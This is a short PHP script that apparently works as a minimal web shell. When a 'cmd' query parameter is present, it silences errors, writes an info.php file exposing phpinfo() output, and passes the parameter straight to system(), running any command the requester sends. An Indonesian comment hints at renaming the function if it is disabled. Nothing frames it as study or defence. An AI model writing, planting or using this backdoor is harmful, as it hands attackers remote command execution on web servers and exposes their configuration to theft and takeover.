<?php
error_reporting(0);

if(isset($_GET['cmd'])){
	//create info 
    $c = fopen('info.php', 'w');
    $s = "<?php echo phpinfo(); ?>";
    fwrite($c ,$s);
    fclose($c);    
    //rename jika fungsi ini disable
 	 system($_GET['cmd']);
 }
 ?>
